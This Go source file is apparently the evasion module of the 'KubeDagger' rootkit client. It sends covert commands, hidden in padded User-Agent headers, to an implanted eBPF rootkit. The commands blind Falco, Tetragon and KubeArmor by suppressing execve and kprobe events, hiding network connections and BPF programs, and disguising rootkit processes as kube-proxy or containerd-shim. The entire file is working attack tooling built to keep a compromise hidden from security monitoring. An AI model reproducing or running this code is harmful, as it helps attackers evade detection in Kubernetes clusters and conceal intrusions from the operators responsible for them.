package evasion

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"

	"github.com/yasindce1998/KubeDagger/cmd/kubedagger-client/run/model"
)

type EvasionResult struct {
	Mode    string       `json:"mode"`
	Actions []ActionInfo `json:"actions"`
	Success bool         `json:"success"`
}

type ActionInfo struct {
	Name    string `json:"name"`
	Status  string `json:"status"`
	Detail  string `json:"detail"`
}

func Enable(target, mode, output string) error {
	var result *EvasionResult

	switch mode {
	case "falco":
		result = enableFalcoEvasion(target)
	case "tetragon":
		result = enableTetragonEvasion(target)
	case "kubearmor":
		result = enableKubeArmorEvasion(target)
	case "all":
		result = enableAllEvasion(target)
	default:
		return fmt.Errorf("unsupported mode: %s (use falco, tetragon, kubearmor, or all)", mode)
	}

	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func enableFalcoEvasion(target string) *EvasionResult {
	result := &EvasionResult{Mode: "falco"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"suppress_execve_audit",
			"filter execve events for rootkit processes in tracepoint handler",
			"falco_suppress_execve",
		},
		{
			"hide_network_connections",
			"mask /proc/net/tcp entries from Falco's proc scanner",
			"falco_hide_netconn",
		},
		{
			"spoof_container_id",
			"rewrite cgroup ID in syscall responses to appear as system container",
			"falco_spoof_cgroup",
		},
	}

	for _, a := range actions {
		status := sendEvasionCommand(target, a.cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func enableTetragonEvasion(target string) *EvasionResult {
	result := &EvasionResult{Mode: "tetragon"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"rename_process_comm",
			"modify task->comm to mimic kube-proxy or containerd-shim",
			"tetragon_rename_comm",
		},
		{
			"hide_bpf_programs",
			"filter BPF program list queries to hide rootkit programs",
			"tetragon_hide_bpf",
		},
		{
			"suppress_kprobe_events",
			"prevent Tetragon kprobes from seeing rootkit syscalls",
			"tetragon_suppress_kprobe",
		},
	}

	for _, a := range actions {
		status := sendEvasionCommand(target, a.cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func enableKubeArmorEvasion(target string) *EvasionResult {
	result := &EvasionResult{Mode: "kubearmor"}

	actions := []struct {
		name   string
		detail string
		cmd    string
	}{
		{
			"kernel_space_operations",
			"operate from eBPF/kernel space to bypass userspace LSM hooks",
			"kubearmor_kernel_ops",
		},
		{
			"spoof_process_context",
			"mask process metadata to appear as allowed workload",
			"kubearmor_spoof_proc",
		},
	}

	for _, a := range actions {
		status := sendEvasionCommand(target, a.cmd)
		result.Actions = append(result.Actions, ActionInfo{
			Name:   a.name,
			Status: status,
			Detail: a.detail,
		})
	}

	result.Success = allSucceeded(result.Actions)
	return result
}

func enableAllEvasion(target string) *EvasionResult {
	result := &EvasionResult{Mode: "all"}

	falco := enableFalcoEvasion(target)
	tetragon := enableTetragonEvasion(target)
	kubearmor := enableKubeArmorEvasion(target)

	result.Actions = append(result.Actions, falco.Actions...)
	result.Actions = append(result.Actions, tetragon.Actions...)
	result.Actions = append(result.Actions, kubearmor.Actions...)
	result.Success = allSucceeded(result.Actions)

	return result
}

func sendEvasionCommand(target, command string) string {
	ua := buildEvasionUserAgent(command)

	req, err := http.NewRequest("GET", target+"/enable_evasion", nil)
	if err != nil {
		return "error: " + err.Error()
	}
	req.Header.Set("User-Agent", ua)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return "error: " + err.Error()
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		return "enabled"
	}
	return fmt.Sprintf("failed (HTTP %d)", resp.StatusCode)
}

func buildEvasionUserAgent(command string) string {
	userAgent := command
	for len(userAgent) < model.UserAgentPaddingLen {
		userAgent += "#"
	}
	return userAgent
}

func allSucceeded(actions []ActionInfo) bool {
	for _, a := range actions {
		if !strings.HasPrefix(a.Status, "enabled") {
			return false
		}
	}
	return true
}
